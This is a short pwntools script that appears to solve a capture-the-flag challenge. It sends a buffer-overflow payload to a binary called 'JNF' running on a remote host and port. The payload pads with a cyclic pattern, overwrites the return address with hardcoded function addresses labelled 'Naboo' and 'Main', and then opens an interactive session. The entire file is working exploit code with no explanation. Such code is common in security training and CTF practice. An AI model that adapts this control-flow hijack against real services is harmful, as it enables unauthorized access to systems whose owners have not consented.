from pwn import *

BINARY = './JNF'

context.binary = BINARY
binary = ELF(BINARY)
rop = ROP(binary) # for finding gadgets
# p = process(BINARY)
p = remote('192.241.138.174', 9996)

#gdb.attach(p, '''
#continue
#''')

#p.recvuntil('SYSTEM CONSOLE>')

payload = b'1'
payload += cyclic(cyclic_find(b'auaa'))
payload += pack(0x40068a) #Naboo
payload += pack(0x40069b) #Main
#payload += pack(0x400679) # Endor
p.sendline(payload)

p.interactive()
